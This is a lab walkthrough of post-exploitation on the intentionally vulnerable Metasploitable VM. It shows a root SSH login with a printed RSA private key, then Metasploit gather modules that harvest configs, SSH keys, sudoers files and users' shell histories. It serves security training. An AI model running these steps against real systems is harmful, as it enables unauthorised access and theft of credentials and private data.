
Metasploitable/Post

Okay, so you've got root on Metasploitable, you've taken advantage of the many, many rat holes leading you deep into the bowels of the system - but now what?
Contents [hide]

    1 Gather
        1.1 Electric Sheep or Real Sheep
        1.2 Enumerate Configurations
        1.3 Enumerate Network
        1.4 Enumerate Protections
        1.5 Enumerate the System
        1.6 Enumerate User History
    2 Flags

Gather

Let's suppose you are in your metasploitable workspace:

msf > workspace
  default
* metasploitable
msf >

Let's also assume you've loaded up the private/public key exploit, and successfully validated that you can log in remotely.

msf > use auxiliary/scanner/ssh/ssh_login_pubkey
msf auxiliary(ssh_login_pubkey) > set KEY_PATH /root/r00tmsfkey
KEY_PATH => /root/r00tmsfkey
msf auxiliary(ssh_login_pubkey) > set USERNAME root
USERNAME => root
msf auxiliary(ssh_login_pubkey) > set RHOSTS 10.0.0.27
RHOSTS => 10.0.0.27
msf auxiliary(ssh_login_pubkey) > run

[*] 10.0.0.27:22 SSH - Testing Cleartext Keys
[*] 10.0.0.27:22 SSH - Testing 1 keys from /root/r00tmsfkey
[+] 10.0.0.27:22 SSH - Success: 'root:-----BEGIN RSA PRIVATE KEY-----
MIIEoQIBAAKCAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqld
JkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qO
ffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5
JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9I
yhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7b
wkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3wIBIwKCAQBaUjR5bUXnHGA5fd8N
UqrUx0zeBQsKlv1bK5DVm1GSzLj4TU/S83B1NF5/1ihzofI7OAQvlCdUY2tHpGGa
zQ6ImSpUQ5i9+GgBUOaklRL/i9cHdFv7PSonW+SvF1UKY5EidEJRb/O6oFgB5q8G
JKrwu+HPNhvD+dliBnCn0JU+Op/1Af7XxAP814Rz0nZZwx+9KBWVdAAbBIQ5zpRO
eBBlLSGDsnsQN/lG7w8sHDqsSt2BCK8c9ct31n14TK6HgOx3EuSbisEmKKwhWV6/
ui/qWrrzurXA4Q73wO1cPtPg4sx2JBh3EMRm9tfyCCtB1gBi0N/2L7j9xuZGGY6h
JETbAoGBANI8HzRjytWBMvXh6TnMOa5S7GjoLjdA3HXhekyd9DHywrA1pby5nWP7
VNP+ORL/sSNl+jugkOVQYWGG1HZYHk+OQVo3qLiecBtp3GLsYGzANA/EDHmYMUSm
4v3WnhgYMXMDxZemTcGEyLwurPHumgy5nygSEuNDKUFfWO3mymIXAoGBAMqZi3YL
zDpL9Ydj6JhO51aoQVT91LpWMCgK5sREhAliWTWjlwrkroqyaWAUQYkLeyA8yUPZ
PufBmrO0FkNa+4825vg48dyq6CVobHHR/GcjAzXiengi6i/tzHbA0PEai0aUmvwY
OasZYEQI47geBvVD3v7D/gPDQNoXG/PWIPt5AoGBAMw6Z3S4tmkBKjCvkhrjpb9J
PW05UXeA1ilesVG+Ayk096PcV9vngvNpLdVAGi+2jtHuCQa5PEx5+DLav8Nriyi2
E5l35bqoiilCQ83PriCAMpL49iz6Pn00Z3o+My1ZVJudQ5qhjVznY+oBdM3DNpAE
xn6yeL+DEiI/XbPngsWvAoGAbfuU2a6iEQSp28iFlIKa10VlS2U493CdzJg0IWcF
2TVjoMaFMcyZQ/pzt9B7WQY7hodl8aHRsQKzERieXxQiKSxuwUN7+3K4iVXxuiGJ
BMndK+FYbRpEnaz591K6kYNwLaEg70BZ0ek0QjC2Ih7t1ZnfdFvEaHFPF05foaAg
iIMCgYAsNZut02SC6hwwaWh3Uxr07s6jB8HyrET0v1vOyOe3xSJ9YPt7c1Y20OQO
Fb3Yq4pdHm7AosAgtfC1eQi/xbXP73kloEmg39NZAfT3wg817FXiS2QGHXJ4/dmK
94Z9XOEDocClV7hr9H//hoO8fV/PHXh0oFQvw1d+29nf+sgWDg==
-----END RSA PRIVATE KEY-----
' 'uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 1 opened (10.0.0.5:33035 -> 10.0.0.27:22) at 2016-03-26 19:52:24 -0700
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login_pubkey) >

Now you can view the session that was created. It is ready for you to open:

msf auxiliary(ssh_login_pubkey) > sessions

Active sessions
===============

  Id  Type         Information               Connection
  --  ----         -----------               ----------
  1   shell linux  SSH root: (10.0.0.27:22)  10.0.0.5:33035 -> 10.0.0.27:22 (10.0.0.27)

msf auxiliary(ssh_login_pubkey) >

We are actually going to use it now with some post modules in Metasploit.
Electric Sheep or Real Sheep

Check if this operating system is running in a real machine or a virtual machine:

msf auxiliary(ssh_login_pubkey) > use post/linux/gather/checkvm
msf post(checkvm) > show options

Module options (post/linux/gather/checkvm):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf post(checkvm) > set SESSION 1
SESSION => 1
msf post(checkvm) > run

[*] Gathering System info ....
[+] This appears to be a 'VirtualBox' virtual machine
[*] Post module execution completed
msf post(checkvm) >

Enumerate Configurations

Enumerate all the things! Any important config files will be found, copied, and reported on:

msf > use post/linux/gather/enum_configs
msf post(enum_configs) > show options

Module options (post/linux/gather/enum_configs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf post(enum_configs) > set SESSION 1
SESSION => 1
msf post(enum_configs) > run

[*] Running module against metasploitable
[*] Info:
[*] 	Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
[*] 	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
[*] apache2.conf stored in /root/.msf5/loot/20160326195706_metasploitable_10.0.0.27_linux.enum.conf_314929.txt
[*] ports.conf stored in /root/.msf5/loot/20160326195707_metasploitable_10.0.0.27_linux.enum.conf_747688.txt
[*] my.cnf stored in /root/.msf5/loot/20160326195709_metasploitable_10.0.0.27_linux.enum.conf_423396.txt
[*] ufw.conf stored in /root/.msf5/loot/20160326195710_metasploitable_10.0.0.27_linux.enum.conf_385555.txt
[*] sysctl.conf stored in /root/.msf5/loot/20160326195710_metasploitable_10.0.0.27_linux.enum.conf_404816.txt
[*] shells stored in /root/.msf5/loot/20160326195712_metasploitable_10.0.0.27_linux.enum.conf_818615.txt
[*] access.conf stored in /root/.msf5/loot/20160326195715_metasploitable_10.0.0.27_linux.enum.conf_874317.txt
[*] rpc stored in /root/.msf5/loot/20160326195717_metasploitable_10.0.0.27_linux.enum.conf_633057.txt
[*] debian.cnf stored in /root/.msf5/loot/20160326195718_metasploitable_10.0.0.27_linux.enum.conf_373393.txt
[*] logrotate.conf stored in /root/.msf5/loot/20160326195720_metasploitable_10.0.0.27_linux.enum.conf_273101.txt
[*] smb.conf stored in /root/.msf5/loot/20160326195721_metasploitable_10.0.0.27_linux.enum.conf_054028.txt
[*] ldap.conf stored in /root/.msf5/loot/20160326195722_metasploitable_10.0.0.27_linux.enum.conf_971571.txt
[*] sysctl.conf stored in /root/.msf5/loot/20160326195726_metasploitable_10.0.0.27_linux.enum.conf_542417.txt
[*] Post module execution completed
msf post(enum_configs) >


Enumerate Network

You can also enumerate any and all network connections and information with the enum_network module:

msf > use post/linux/gather/enum_network
msf post(enum_network) > set SESSION 1
SESSION => 1
msf post(enum_network) > run

[*] Running module against metasploitable
[*] Module running as root
[+] Info:
[+] 	Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
[+] 	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
[*] Collecting data...
[*] Network config stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_406438.txt
[*] Route table stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_914437.txt
[*] Firewall config stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_669572.txt
[*] DNS config stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_456351.txt
[*] SSHD config stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_297799.txt
[*] Host file stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_107690.txt
[*] SSH keys stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_441524.txt
[*] Active connections stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_626274.txt
[*] Wireless information stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_099826.txt
[*] Listening ports stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_863941.txt
[*] If-Up/If-Down stored in /root/.msf5/loot/20160326200000_metasploitable_10.0.0.27_linux.enum.netwo_728430.txt
[*] Post module execution completed
msf post(enum_network) >


Enumerate Protections

Next step in the post-exploit process is to enumerate any tools on the system that might be used to protect the system or identify intruders.

msf post(enum_network) > use post/linux/gather/enum_protections
msf post(enum_protections) > set SESSION 1
SESSION => 1
msf post(enum_protections) > run

[*] Running module against metasploitable
[*] Info:
[*]     Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
[*] 	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
[*] Finding installed applications...
[+] ufw found: /usr/sbin/ufw
[+] logrotate found: /usr/sbin/logrotate
[+] tcpdump found: /usr/sbin/tcpdump
[*] Installed applications saved to notes.
[*] Post module execution completed
msf post(enum_protections) >

Enumerate the System

Enumerate various system-related things:

msf post(enum_protections) > use post/linux/gather/enum_system
msf post(enum_system) > set SESSION 1
SESSION => 1
msf post(enum_system) > run

[+] Info:
[+]    Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
[+] 	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
[+] 	Module running as "root" user
[*] Linux version stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_487491.txt
[*] User accounts stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_970409.txt
[*] Installed Packages stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_700060.txt
[*] Running Services stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_317107.txt
[*] Cron jobs stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_925574.txt
[*] Disk info stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_498444.txt
[*] Logfiles stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_082265.txt
[*] Setuid/setgid files stored in /root/.msf5/loot/20160326214645_metasploitable_10.0.0.27_linux.enum.syste_964401.txt
[*] Post module execution completed
msf post(enum_system) >

Enumerate User History

Finally, we can make a list of each user's shell history, if it's available, using the enum_user_history module:

msf post(enum_system) > use post/linux/gather/enum_users_history
msf post(enum_users_history) > set SESSION 1
SESSION => 1
msf post(enum_users_history) > run

[+] Info:
[+]    Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
[+] 	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
[*] bash history for postgres stored in /root/.msf5/loot/20160326215328_metasploitable_10.0.0.27_linux.enum.users_996219.txt
[*] bash history for user stored in /root/.msf5/loot/20160326215407_metasploitable_10.0.0.27_linux.enum.users_262244.txt
[*] Last logs stored in /root/.msf5/loot/20160326215503_metasploitable_10.0.0.27_linux.enum.users_745834.txt
[*] Sudoers stored in /root/.msf5/loot/20160326215503_metasploitable_10.0.0.27_linux.enum.users_002882.txt
[*] Post module execution completed
msf post(enum_users_history) >

Flags
